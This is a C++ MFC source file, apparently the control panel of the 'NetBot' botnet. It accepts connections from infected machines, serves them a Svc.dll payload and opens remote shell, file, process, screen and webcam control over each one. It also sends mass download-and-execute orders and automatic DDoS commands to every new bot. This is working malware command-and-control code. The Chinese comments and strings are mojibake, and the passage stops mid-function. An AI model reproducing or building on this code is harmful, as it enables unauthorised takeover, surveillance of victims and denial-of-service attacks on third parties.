// NetBotDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "NetBotDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define WM_SOCKET_CLOSE    WM_USER+0x2001

#define WM_FILEDLGSHOW     WM_USER+0x1110
#define WM_SCREENDLGSHOW   WM_USER+0x1111
#define WM_PROCESSDLGSHOW  WM_USER+0x1112
#define WM_SHELLDLGSHOW    WM_USER+0x1113
#define WM_VIDEODLGSHOW    WM_USER+0x1114

typedef struct tagSocketInput
{
	SOCKET sMainConnect;
	SOCKET sHelpConnect;
}SocketInput, *LPSocketInput;

/////////////////////////////////////////////////////////////////////////////
// CNetBotDlg dialog

CNetBotDlg::CNetBotDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CNetBotDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CNetBotDlg)
	m_ExecUrl = _T("http://www.a.com/nb.exe");
	m_OpenUrl = _T("http://www.a.com/index.html");
	m_SelNum = 100;
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	hAcceptThread = NULL;
	hCheckThread = NULL;
	m_ListenPort = 80;
	m_CurrSock = INVALID_SOCKET;
	m_CurrIndex = -1;
	ZeroMemory(&m_AutoAttack, sizeof(AutoAttack));
}

void CNetBotDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CNetBotDlg)
	DDX_Control(pDX, IDC_LIST_ONLINE, m_OnLineList);
	DDX_Text(pDX, IDC_EXEC_URL, m_ExecUrl);
	DDX_Text(pDX, IDC_OPEN_URL, m_OpenUrl);
	DDX_Text(pDX, IDC_EDIT_SELNUM, m_SelNum);
	DDV_MinMaxInt(pDX, m_SelNum, 0, 100000);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CNetBotDlg, CDialog)
	//{{AFX_MSG_MAP(CNetBotDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_CLICK, IDC_LIST_ONLINE, OnClickListOnline)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_ONLINE, OnRclickListOnline)
	ON_COMMAND(ID_ONLINE_POWEROFF, OnOnlinePoweroff)
	ON_COMMAND(ID_ONLINE_REBOOT, OnOnlineReboot)
	ON_COMMAND(ID_ONLINE_LOGOFF, OnOnlineLogoff)
	ON_COMMAND(ID_ONLINE_UNINSTALL, OnOnlineUninstall)
	ON_COMMAND(ID_ONLINE_FILEMANAGE, OnOnlineFilemanage)
	ON_COMMAND(ID_ONLINE_SCREEN, OnOnlineScreen)
	ON_COMMAND(ID_ONLINE_PROCESS, OnOnlineProcess)
	ON_COMMAND(ID_ONLINE_SHELL, OnOnlineShell)
	ON_BN_CLICKED(IDC_BTN_MULPOWEROFF, OnBtnMulpoweroff)
	ON_BN_CLICKED(IDC_BTN_MULREBOOT, OnBtnMulreboot)
	ON_BN_CLICKED(IDC_BTN_MULEXEC, OnBtnMulexec)
	ON_BN_CLICKED(IDC_BTN_MULOPEN, OnBtnMulopen)
	ON_COMMAND(ID_BTN_TUPDATE, OnBtnTupdate)
	ON_COMMAND(ID_BTN_TSERVER, OnBtnTserver)
	ON_COMMAND(ID_BTN_TONLINE, OnBtnTonline)
	ON_COMMAND(ID_BTN_THELP, OnBtnThelp)
	ON_COMMAND(ID_BTN_TEXIT, OnBtnTexit)
	ON_COMMAND(ID_BTN_TDDOS, OnBtnTddos)
	ON_COMMAND(ID_BTN_TCONFIG, OnBtnTconfig)
	ON_COMMAND(ID_BTN_TWEBSITE, OnBtnTwebsite)
	ON_COMMAND(ID_ONLINE_VIDEO, OnOnlineVideo)
	ON_BN_CLICKED(IDC_BTN_SELNUM, OnBtnSelNum)
	ON_COMMAND(ID_BTN_TFILETRAN, OnBtnTfiletran)
	ON_WM_CLOSE()
	ON_COMMAND(ID_ONLINE_RESTART, OnOnlineRestart)
	//}}AFX_MSG_MAP
	ON_COMMAND_RANGE(IDC_RADIO1, IDC_RADIO5, OnSelectComputer)
	ON_MESSAGE(WM_SOCKET_CLOSE, OnCloseEvent)
	ON_MESSAGE(WM_FILEDLGSHOW, OnFileDlgShow)
	ON_MESSAGE(WM_SCREENDLGSHOW, OnScreenDlgShow)
	ON_MESSAGE(WM_PROCESSDLGSHOW, OnProcessDlgShow)
	ON_MESSAGE(WM_SHELLDLGSHOW, OnShellDlgShow)
	ON_MESSAGE(WM_VIDEODLGSHOW, OnVideoDlgShow)
	ON_MESSAGE(WM_SOCKET_CLOSE, OnSerDown)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CNetBotDlg message handlers
LRESULT CNetBotDlg::OnSerDown(WPARAM wParam, LPARAM lParam)
{
	switch (LOWORD(lParam))
	{
	case FD_CLOSE:
		checkfun();

		break;

	default:
		break;
	}

	return 0;
}

LRESULT CNetBotDlg::OnFileDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;

	CFileDlg* pFileDlg = new CFileDlg;
	pFileDlg->Create(IDD_FILE_DLG, GetDesktopWindow());
	pFileDlg->ShowWindow(SW_SHOW);
	pFileDlg->SetConnSocket(pInput->sMainConnect);

	delete pInput;
	return 0;
}

LRESULT CNetBotDlg::OnScreenDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;

	CScreenDlg* pScreenDlg = new CScreenDlg;
	pScreenDlg->Create(IDD_SCREEN_DLG, GetDesktopWindow());
	pScreenDlg->ShowWindow(SW_SHOW);
	pScreenDlg->SetConnSocket(pInput->sMainConnect, pInput->sHelpConnect);

	delete pInput;
	return 0;
}

LRESULT CNetBotDlg::OnProcessDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;

	CProcessDlg* pProcessDlg = new CProcessDlg;
	pProcessDlg->Create(IDD_PROCESS_DLG, GetDesktopWindow());
	pProcessDlg->ShowWindow(SW_SHOWNA);
	pProcessDlg->SetConnSocket(pInput->sMainConnect);

	delete pInput;
	return 0;
}

LRESULT CNetBotDlg::OnShellDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;

	CShellDlg* pShellDlg = new CShellDlg;
	pShellDlg->Create(IDD_SHELL_DLG, GetDesktopWindow());
	pShellDlg->ShowWindow(SW_SHOW);
	pShellDlg->SetConnSocket(pInput->sMainConnect);

	delete pInput;
	return 0;
}

LRESULT CNetBotDlg::OnVideoDlgShow(WPARAM wParam, LPARAM lParam)
{
	LPSocketInput pInput = (LPSocketInput)wParam;

	CVideoDlg* pVideoDlg = new CVideoDlg;
	pVideoDlg->Create(IDD_VIDEO_DLG, GetDesktopWindow());
	pVideoDlg->ShowWindow(SW_SHOW);
	pVideoDlg->SetConnSocket(pInput->sMainConnect);

	delete pInput;
	return 0;
}

void CNetBotDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

void CNetBotDlg::CreateIniFile()
{
	char Path[255];
	GetCurrentDirectory(255, Path);
	CString path;
	path.Format("%s\\NetBot.ini", Path);
	if (!m_Ini.SetPath(path))
	{
		m_Ini.Createini();
		m_Ini.SetKeyValue("Client Setting", "ListenPort", "80");
		m_Ini.SetKeyValue("Client Setting", "MaxConnect", "10000");
		m_Ini.SetKeyValue("Client Setting", "DUAutoClose", "0");
		m_Ini.SetKeyValue("Client Setting", "Skin", "1");

		m_Ini.SetKeyValue("Server Settin", "IPFile", "http://www.a.com/ip.jpg");
		m_Ini.SetKeyValue("Server Setting", "ConnectPass", "111111");

		m_Ini.SetKeyValue("FTP Setting", "FtpAddress", "127.0.0.1");
		m_Ini.SetKeyValue("FTP Setting", "FtpPort", "21");
		m_Ini.SetKeyValue("FTP Setting", "FtpUsername", "lky");
		m_Ini.SetKeyValue("FTP Setting", "FtpPassword", "lx");
		m_Ini.SetKeyValue("FTP Setting", "FilePath", "\\ip.jpg");

		m_Ini.SetKeyValue("DNS Setting", "DnsUser", "lky");
		m_Ini.SetKeyValue("DNS Setting", "DnsPass", "lx");
		m_Ini.SetKeyValue("DNS Setting", "DnsDomain", "www.3322.org");
	}
	else
	{
		CString temp;
		temp = m_Ini.GetKeyValue("Client Setting", "ListenPort");
		m_ListenPort = atoi(temp);
		temp = m_Ini.GetKeyValue("Client Setting", "MaxConnect");
		m_ConnectMax = atoi(temp);
	}
	UpdateData(FALSE);
}

//#include "start.h"

BOOL CNetBotDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here
	CreateIniFile();
	////////////////////////////////////////////////////////////////////////
	//create toolbar
	if (!m_wndtoolbar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC,
		CRect(0, 0, 0, 0)) || !m_wndtoolbar.LoadToolBar(IDR_MAINTOOLBAR))
	{
		TRACE0("failed to create toolbar\n");
		return FALSE;
	}
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);
	m_wndtoolbar.LoadTrueColorToolBar(16, IDB_BMP_MAIN, IDB_BMP_MAIN, IDB_BMP_MAIN);
	//-----------------------------------------------------------------------------
	//���ù�������ʾ���Ϊͼ����·��ı���ʽ
	CString strButton;
	CRect rectButton;
	for (int ii = 0; ii < m_wndtoolbar.GetCount(); ii++)//Ϊÿ����ť�����ı�
	{
		UINT id = m_wndtoolbar.GetItemID(ii);
		if (!strButton.LoadString(id))
			continue;
		int j = strButton.Find(_T('\n'));
		if (j < 0) continue;
		strButton = strButton.Right(strButton.GetLength() - j - 1);
		m_wndtoolbar.SetButtonText(ii, strButton);
	}
	m_wndtoolbar.GetItemRect(0, &rectButton);//�����µĹ�������С
	m_wndtoolbar.SetSizes(rectButton.Size(), CSize(16, 16));
	//-----------------------------------------------------------------------------
	////////////////////////////////////////////////////////////////////////
	//create statusbar
	m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM, CRect(0, 0, 0, 0), this, 0x1000003);
	int strPartDim[3] = { 350,550,-1 };
	m_wndStatusBar.SetParts(3, strPartDim);
	m_wndStatusBar.SetText("��ǰ�������� [0]", 2, 0);
	////////////////////////////////////////////////////////////////////////
	//create online list
	ListView_SetExtendedListViewStyle(m_OnLineList.m_hWnd, LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT | LVS_EX_CHECKBOXES);
	m_OnLineList.InsertColumn(0, "IP��ַ/�˿�", LVCFMT_LEFT, 200);
	m_OnLineList.InsertColumn(1, "�������", LVCFMT_LEFT, 130);
	m_OnLineList.InsertColumn(2, "���ڵ���", LVCFMT_LEFT, 140);
	m_OnLineList.InsertColumn(3, "����ϵͳ", LVCFMT_LEFT, 240);
	m_OnLineList.InsertColumn(4, "�ڴ�", LVCFMT_LEFT, 70);
	m_OnLineList.InsertColumn(5, "�汾", LVCFMT_LEFT, 100);
	m_OnLineList.InsertColumn(6, "״̬", LVCFMT_LEFT, 70);
	m_ImageOnlinelist.Create(14, 14, ILC_COLOR24 | ILC_MASK, 2, 2);
	HICON hIcon0 = ::LoadIcon(AfxGetResourceHandle(), MAKEINTRESOURCE(IDI_LIST_ONLINE));
	m_ImageOnlinelist.Add(hIcon0);
	hIcon0 = ::LoadIcon(AfxGetResourceHandle(), MAKEINTRESOURCE(IDI_LIST_VIDEO));
	m_ImageOnlinelist.Add(hIcon0);
	m_OnLineList.SetImageList(&m_ImageOnlinelist, LVSIL_SMALL);//�����б�����ͼ��

	////////////////////////////////////////////////////////////////////////
	/****����DDOS�Ի���*****/
	CRect rcDlgs;
	GetDlgItem(IDC_DLG_RECT)->GetWindowRect(rcDlgs);
	ScreenToClient(rcDlgs);
	rcDlgs.right -= 2;
	rcDlgs.bottom -= 2;
	m_DDosDlg.Create(IDD_DDOS_DLG, this);
	m_DDosDlg.MoveWindow(rcDlgs);
	m_DDosDlg.ShowWindow(SW_HIDE);

	/****�����ļ�����Ի���*****/
	m_TranDlg.Create(IDD_FILETRAN_DLG, this);
	m_TranDlg.ShowWindow(SW_HIDE);

	/*------QQWry.dat------------------------------------------------------*/
	char Path[255];
	GetCurrentDirectory(255, Path);
	CString path;
	path.Format("%s\\QQWry.Dat", Path);
	m_QQDat.SetPath(path);

	StartListen(m_ListenPort);

	//�ڴ��������Ի��� ����ʼ���˸����ӶԻ����Ժ�������������
	if (((CNetBotApp*)AfxGetApp())->pSplash != NULL)
		((CNetBotApp*)AfxGetApp())->pSplash->Hide();

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CNetBotDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM)dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CNetBotDlg::OnQueryDragIcon()
{
	return (HCURSOR)m_hIcon;
}

BOOL CNetBotDlg::DestroyWindow()
{
	// TODO: Add your specialized code here and/or call the base class
	StopListen();

	SOCKET ClientSocket;
	int iCount = m_OnLineList.GetItemCount();
	for (int i = 0; i < iCount; i++)
	{
		ClientSocket = (SOCKET)m_OnLineList.GetItemData(i);
		shutdown(ClientSocket, 0x02);
		closesocket(ClientSocket);
	}

	m_DDosDlg.DestroyWindow();//���ͷţ����ڴ�й¶��
	m_TranDlg.DestroyWindow();
	return CDialog::DestroyWindow();
}

BOOL CNetBotDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (nVirtKey == VK_RETURN)
		{
			//����ǻس�����������Ҫ��������,����ʲôҲ����
			return TRUE;
		}
		if (nVirtKey == VK_ESCAPE)
		{
			//�����ESC����������Ҫ��������,����ʲôҲ����
			return TRUE;
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT CNetBotDlg::OnCloseEvent(WPARAM wParam, LPARAM lParam)
{
	if (WSAGETSELECTEVENT(lParam) == FD_CLOSE)
	{
		//ɾ�������
		SOCKET ClientSocket = (SOCKET)wParam;

		CAutoLock Lock(cOnlineLock);

		int iCount = m_OnLineList.GetItemCount();
		for (int i = 0; i < iCount; i++)
		{
			if (ClientSocket == (SOCKET)m_OnLineList.GetItemData(i))
			{
				m_OnLineList.DeleteItem(i);
				StatusTextOut(2, "��ǰ�������� [%d]", m_OnLineList.GetItemCount());
				break;
			}
		}

		checkfun();
	}

	return TRUE;
}
///////////////////////////////////////////////////////////////////////////////////
//
void CNetBotDlg::EnableOnlineCtrls(BOOL bEnable)
{
	CWnd* pWndCtl = GetWindow(GW_CHILD);

	CRect rcShow, rcTest, rcControl;
	GetDlgItem(IDC_DLG_RECT)->GetWindowRect(rcShow);

	while (pWndCtl != NULL)
	{
		pWndCtl->GetWindowRect(rcControl);
		if (rcTest.IntersectRect(rcShow, rcControl))
		{
			if (bEnable)
				pWndCtl->ShowWindow(SW_SHOW);
			else
				pWndCtl->ShowWindow(SW_HIDE);
		}
		pWndCtl = pWndCtl->GetWindow(GW_HWNDNEXT);
	}
}

void CNetBotDlg::OnBtnTonline()
{
	//��������
	EnableOnlineCtrls(TRUE);
	m_OnLineList.ShowWindow(SW_SHOW);
	m_DDosDlg.ShowWindow(SW_HIDE);
}

void CNetBotDlg::OnBtnTfiletran()
{
	// TODO: Add your command handler code here
	if (!m_TranDlg.IsWindowVisible())
		m_TranDlg.ShowWindow(SW_SHOW);
	m_TranDlg.CenterWindow();
	m_TranDlg.BringWindowToTop();
}

void CNetBotDlg::OnBtnTddos()
{
	//ѹ������
	EnableOnlineCtrls(FALSE);
	m_OnLineList.ShowWindow(SW_HIDE);
	m_DDosDlg.ShowWindow(SW_SHOW);
}

void CNetBotDlg::OnBtnTconfig()
{
	//ϵͳ����
	CSetDlg m_SetDlg;
	m_SetDlg.DoModal();
}

void CNetBotDlg::OnBtnTupdate()
{
	//���߸���
	CUpdateDlg m_UpdateDlg;
	m_UpdateDlg.DoModal();
}

void CNetBotDlg::OnBtnTserver()
{
	//������
	CServerDlg m_ServerDlg;
	m_ServerDlg.DoModal();
}

void CNetBotDlg::OnBtnThelp()
{
	//����
	ShellExecute(0, "open", "help.chm", NULL, NULL, 5);
}

void CNetBotDlg::OnBtnTexit()
{
	//�˳�ϵͳ
	OnCancel();
}

void CNetBotDlg::OnBtnTwebsite()
{
	//�ٷ���վ

}

void CNetBotDlg::OnSelectComputer(UINT nID)
{
	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int i = 0;
	switch (nID)
	{
	case IDC_RADIO1://WinXP
		for (i = 0; i < AllNum; i++)
		{
			CString ip;
			ip = m_OnLineList.GetItemText(i, 3);
			if (ip.Find("XP")>0)
			{
				m_OnLineList.SetCheck(i, TRUE);
			}
			else
				m_OnLineList.SetCheck(i, FALSE);
		}
		break;
	case IDC_RADIO2://Win2000&2003
		for (i = 0; i < AllNum; i++)
		{
			CString ip;
			ip = m_OnLineList.GetItemText(i, 3);
			if (ip.Find("2000")>0 || ip.Find("2003") > 0)
			{
				m_OnLineList.SetCheck(i, TRUE);
			}
			else
				m_OnLineList.SetCheck(i, FALSE);
		}
		break;
	case IDC_RADIO3://Sel All
		for (i = 0; i < AllNum; i++)
		{
			m_OnLineList.SetCheck(i, TRUE);
		}
		break;
	case IDC_RADIO4://Anit-Sel
		for (i = 0; i < AllNum; i++)
		{
			m_OnLineList.SetCheck(i, !m_OnLineList.GetCheck(i));
		}
		break;
	case IDC_RADIO5://Cancel Sel
		for (i = 0; i < AllNum; i++)
		{
			m_OnLineList.SetCheck(i, FALSE);
		}
	default:
		break;
	}
}

void CNetBotDlg::OnBtnSelNum()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	CAutoLock Lock(cOnlineLock);

	int AllNum = m_OnLineList.GetItemCount();
	int iSendNum = 0;

	for (int i = 0; i < AllNum; i++)
	{
		if (!m_OnLineList.GetCheck(i))
		{
			if (iSendNum < m_SelNum)
			{
				m_OnLineList.SetCheck(i, TRUE);
				iSendNum++;
			}
			else
			{//��������
				break;
			}
		}
	}
}

//////////////////////////////////////////////////////////////////////////////
void CNetBotDlg::StartListen(int Port)
{
	m_ListenPort = Port;
	//���������߳�
	hAcceptThread = ThreadTemplate::StartThread<CNetBotDlg, DWORD>(this, &CNetBotDlg::ThreadAccept);
	//�������߼���߳�
	hCheckThread = ThreadTemplate::StartThread<CNetBotDlg, DWORD>(this, &CNetBotDlg::ThreadCheck);

	if (hAcceptThread == NULL || hCheckThread == NULL)
	{
		StopListen();
		ListenError(2);
		return;
	}
}

void CNetBotDlg::StopListen()
{
	DWORD dwExitCode;
	if (hAcceptThread != NULL)
	{
		WaitForSingleObject(hAcceptThread, 100);
		if (GetExitCodeThread(hAcceptThread, &dwExitCode))
		{
			if (dwExitCode == STILL_ACTIVE)
			{
				TerminateThread(hAcceptThread, dwExitCode);
			}
		}
		CloseHandle(hAcceptThread);
		hAcceptThread = NULL;
	}
	if (hCheckThread != NULL)
	{
		WaitForSingleObject(hCheckThread, 100);
		if (GetExitCodeThread(hCheckThread, &dwExitCode))
		{
			if (dwExitCode == STILL_ACTIVE)
			{
				TerminateThread(hCheckThread, dwExitCode);
			}
		}
		CloseHandle(hCheckThread);
		hCheckThread = NULL;
	}
}

void CNetBotDlg::ListenError(int ErrorCode)
{
	CString  strOutText;
	switch (ErrorCode)
	{
	case 1:
		strOutText.Format("�󶨶˿� %d ʧ��", m_ListenPort);
		break;
	case 2:
		strOutText.Format("�����˿� %d ʧ��", m_ListenPort);
		break;
	case 3:
		strOutText.Format("�����˿� %d �ɹ�", m_ListenPort);
		break;
	default:
		strOutText = "û�м�������";
		break;
	}
	StatusTextOut(1, strOutText);
}

int __stdcall ReadData(TCHAR szFile[], char **data)
{
	char szPath[256];
	GetModuleFileName(GetModuleHandle(NULL), szPath, 256);

	for (int i = lstrlen(szPath); i > 0; i--)
	{
		if (szPath[i] == '\\')
		{
			szPath[i] = '\0';
			break;
		}
	}

	SetCurrentDirectory(szPath);

	HANDLE hFile;
	TCHAR szLogFileName[256];
	wsprintf(szLogFileName, _T("%s\\%s"), szPath, szFile);

	hFile = CreateFile(szLogFileName,
		GENERIC_ALL,
		FILE_SHARE_READ,
		(LPSECURITY_ATTRIBUTES)NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = GetFileSize(hFile, NULL);

		*data = (CHAR *)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		ReadFile(hFile, *data, dwSize, &dwSize, NULL);

		CloseHandle(hFile);

		return dwSize;
	}

	MsgErr(_T("Read %s Error"), szLogFileName);

	return -1;
}

DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
{
	if (socket != INVALID_SOCKET)
	{
		//��������
		TurnonKeepAlive(socket, 120);

		//recv socket type
		MsgHead msgHead;
		char    chBuffer[256];

		//����������Ϣ
		if (!RecvMsg(socket, chBuffer, &msgHead))
		{
			return 0;
		}

		switch (msgHead.dwCmd)
		{
		case SOCKET_DLLLOADER:
		{
			PCHAR SvcFileBuf;
			int SvcFileSize = ReadData(_T("Svc.dll"), &SvcFileBuf);

			if (SvcFileSize == -1)
			{
				shutdown(socket, 0x02);
				closesocket(socket);
				break;
			}

			MsgHead msgHead;
			msgHead.dwCmd = CMD_DLLDATA;
			msgHead.dwSize = SvcFileSize;

			SendMsg(socket, SvcFileBuf, &msgHead);

			VirtualFree(SvcFileBuf, SvcFileSize, MEM_RELEASE);
		}
		break;

		case SOCKET_CONNECT://���ӿ��Ƶ�socket
		{
			SysInfo m_SysInfo;
			memcpy(&m_SysInfo, chBuffer, sizeof(SysInfo));//���ض���Ϣ
			//����������Ϣ���ԱȲ�ƷID
			int iVipID = ((CNetBotApp*)AfxGetApp())->VipID;
			((CNetBotApp*)AfxGetApp())->DecryptData((unsigned char*)&m_SysInfo, sizeof(SysInfo), iVipID);//����������Ϣ
			if (iVipID != m_SysInfo.iVipID)
			{
				shutdown(socket, 0x02);
				closesocket(socket);
				break;
			}

			//�����׽��ֹر��¼�֪ͨ
			if (WSAAsyncSelect(socket, GetSafeHwnd(), WM_SOCKET_CLOSE, FD_CLOSE) == SOCKET_ERROR)
			{
				closesocket(socket);
				break;
			}

			//�������������б����
			CAutoLock Lock(cOnlineLock);
			sockaddr_in addr;
			int cb = sizeof(addr);
			getpeername(socket, (sockaddr*)&addr, &cb);

			CString OnlineIP, Address;
			OnlineIP.Format("%s:%u", inet_ntoa(addr.sin_addr), (DWORD)ntohs(addr.sin_port));//��������ת��Ϊ������
			Address = m_QQDat.IPtoAdd(OnlineIP);

			int iCount = m_OnLineList.GetItemCount();
			m_OnLineList.InsertItem(iCount, "", m_SysInfo.bVideo);
			m_OnLineList.SetItemData(iCount, (DWORD)socket);//����socket
			m_OnLineList.SetItemText(iCount, 0, OnlineIP);
			m_OnLineList.SetItemText(iCount, 1, m_SysInfo.cComputer);
			m_OnLineList.SetItemText(iCount, 2, Address);
			m_OnLineList.SetItemText(iCount, 3, m_SysInfo.cOS);
			m_OnLineList.SetItemText(iCount, 4, m_SysInfo.cMemorySize);
			m_OnLineList.SetItemText(iCount, 5, m_SysInfo.cVersion);
			m_OnLineList.SetItemText(iCount, 6, "����");

			StatusTextOut(2, "��ǰ�������� [%d]", m_OnLineList.GetItemCount());

			if (m_AutoAttack.bAutoAttack)//�����Զ�����
			{
				DdosAttack m_Attack;
				memset(&m_Attack, 0, sizeof(DdosAttack));
				strcpy(m_Attack.szTarget, m_AutoAttack.szAttackIP);
				m_Attack.iPort = m_AutoAttack.iAttackPort;
				m_Attack.iThread = m_AutoAttack.iAttackThread;

				MsgHead msgHead;
				msgHead.dwCmd = m_AutoAttack.dwAttackType;
				msgHead.dwSize = sizeof(DdosAttack);

				SendMsg(socket, (char*)&m_Attack, &msgHead);
				m_OnLineList.SetItemText(iCount, 6, "����0");
			}
		}
		break;
		case SOCKET_FILEMANAGE://�ļ������socket
		{
			LPSocketInput pInput = new SocketInput;
			pInput->sMainConnect = socket;
			PostMessage(WM_FILEDLGSHOW, (DWORD)pInput, 0);
		}
		break;
		case SOCKET_SCREEN://��Ļ��ص�socket
		{
			SOCKET sConnect = msgHead.dwExtend1;//���ض���Ϣ
			LPSocketInput pInput = new SocketInput;
			pInput->sMainConnect = socket;
			pInput->sHelpConnect = sConnect;
			PostMessage(WM_SCREENDLGSHOW, (DWORD)pInput, 0);
		}
		break;
		case SOCKET_PROCESS://���̹����socket
		{
			LPSocketInput pInput = new SocketInput;
			pInput->sMainConnect = socket;
			PostMessage(WM_PROCESSDLGSHOW, (DWORD)pInput, 0);
		}
		break;
		case SOCKET_CMDSHELL://Զ��shell��socket
		{
			LPSocketInput pInput = new SocketInput;
			pInput->sMainConnect = socket;
			PostMessage(WM_SHELLDLGSHOW, (DWORD)pInput, 0);
		}
		break;
		case SOCKET_FILEDOWN://�ļ����ص�socket
		{
			if (!m_TranDlg.IsWindowVisible())
				m_TranDlg.ShowWindow(SW_SHOW);
			m_TranDlg.CenterWindow();
			m_TranDlg.BringWindowToTop();
			m_TranDlg.AddTranTask(socket, TRUE);
		}
		break;
		case SOCKET_FILEUP:  //�ļ��ϴ���socket
		{
			if (!m_TranDlg.IsWindowVisible())
				m_TranDlg.ShowWindow(SW_SHOW);
			m_TranDlg.CenterWindow();
			m_TranDlg.BringWindowToTop();
			m_TranDlg.AddTranTask(socket, FALSE);
		}
		break;
		case SOCKET_VIDEOCAP:  //��Ƶ��׽��socket
		{
			LPSocketInput pInput = new SocketInput;
			pInput->sMainConnect = socket;
			PostMessage(WM_VIDEODLGSHOW, (DWORD)pInput, 0);
		}
		break;

		default://ɶ�����ǣ��ص���
		{
			shutdown(socket, 0x02);
			closesocket(socket);
		}
		break;
		}
	}

	return 0;
}

DWORD CNetBotDlg::ThreadAccept()
{
	SOCKET		ClientSocket = INVALID_SOCKET;
	sockaddr_in LocalAddr = { 0 };
	sockaddr_in	ClientAddr = { 0 };
	int			addr_size = sizeof(sockaddr_in);

	WSADATA lpWSAData;
	WSAStartup(MAKEWORD(2, 2), &lpWSAData);

	closesocket(m_ListenSock);
	m_ListenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_port = htons(m_ListenPort);//�����Ķ˿�
	LocalAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	if (bind(m_ListenSock, (LPSOCKADDR)&LocalAddr, addr_size) == SOCKET_ERROR)
	{
		closesocket(m_ListenSock);

		ListenError(1);

		return 0;
	}

	if (listen(m_ListenSock, 10) == SOCKET_ERROR)
	{
		closesocket(m_ListenSock);

		ListenError(2);

		return 0;
	}

	ListenError(3);

	while (m_ListenSock != INVALID_SOCKET)
	{
		ClientSocket = accept(m_ListenSock, (LPSOCKADDR)&ClientAddr, &addr_size); // accept a socket
		if (ClientSocket == INVALID_SOCKET)
		{
			StopListen();
			ListenError(2);

			return 0;
		}
		else
		{
			ThreadTemplate::StartThread<CNetBotDlg, DWORD>(this, &CNetBotDlg::AcceptSocket, ClientSocket);
		}
	}

	return 0;
}

int CNetBotDlg::checkfun()
{
	MsgHead msgHead;
	msgHead.dwCmd = CMD_HEARTBEAT;
	msgHead.dwSize = 0;

	static DWORD dwCount = 0;

	dwCount += 1;
	dwCount %= 3;

	CAutoLock Lock(cOnlineLock);
	int AllNum = m_OnLineList.GetItemCount();
	DWORD socket;

	for (int i = AllNum - dwCount; i > 0; i -= 3)
	{
		socket = m_OnLineList.GetItemData(i);
		if (!SendMsg(socket, NULL, &msgHead))
		{
			shutdown(socket, 0x02);
			closesocket(socket);
			m_OnLineList.DeleteItem(i);
		}
	}

	StatusTextOut(2, "��ǰ�������� [%d]", m_OnLineList.GetItemCount());

	return 0;
}

DWORD CNetBotDlg::ThreadCheck()
{
	while (1)
	{
		checkfun();
		Sleep(60 * 1000);
	}

	return 0;
}

void CNetBotDlg::OnClickListOnline(NMHDR* pNMHDR, LRESULT* pResult)
{
	POSITION pos = m_OnLineList.GetFirstSelectedItemPosition();
	int iCurrSel = m_OnLineList.GetNextSelectedItem(pos);
	if (iCurrSel >= 0)
	{
		m_CurrSock = m_OnLineList.GetItemData(iCurrSel);
		m_CurrIndex = iCurrSel;
	}
	else
	{
